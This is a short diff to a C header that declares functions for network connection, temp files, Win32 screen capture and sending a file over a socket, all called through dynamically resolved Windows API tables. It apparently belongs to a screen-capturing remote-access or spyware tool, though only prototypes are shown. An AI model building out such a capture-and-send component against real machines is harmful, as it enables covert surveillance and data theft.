@@ -25,6 +25,5 @@ int init_connection(const char* hostname, int port, winsock_functions_t* ws_func
 char* create_temp_filename(const char* basename, kernel32_functions_t* kernel_funcs);
 int cleanup_temp_file(const char* filename, kernel32_functions_t* kernel_funcs);
 int capture_screenshot_win32(const char* filename, kernel32_functions_t* kernel32_funcs, user32_functions_t* user32_funcs, gdi32_functions_t* gdi32_funcs);
-//int send_file(const char* filename, SOCKET sock);
-//
-//int cleanup_temp_file(const char* filename);
+
+int send_file_over_socket(SOCKET socket, const char* filepath, winsock_functions_t* ws, kernel32_functions_t* kernel32);
